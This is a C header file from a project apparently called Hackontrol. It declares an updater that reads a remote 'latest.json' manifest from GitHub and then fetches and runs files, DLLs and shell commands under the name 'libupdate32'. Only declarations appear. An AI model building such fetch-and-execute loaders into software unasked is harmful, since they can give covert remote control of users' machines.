#pragma once

#include <khopanwin32.h>
#include <cJSON.h>

#define FILE_LIBUPDATE32     L"libupdate32.dll"
#define FUNCTION_LIBUPDATE32 L"Update"
#define URL_LATEST_FILE      "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/latest.json"

BOOL CheckFileHash(cJSON* root, LPWSTR const filePath);
LPWSTR GetFilePath(cJSON* root);
void ProcessFilesArray(cJSON* root);
void ProcessEntrypointsArray(cJSON* root);
void ProcessEntrypointExecutable(cJSON* root);
void ProcessEntrypointDynamicLinkLibrary(cJSON* root);
void ProcessEntrypointShell(cJSON* root);
void ProcessEntrypointSleep(cJSON* root);
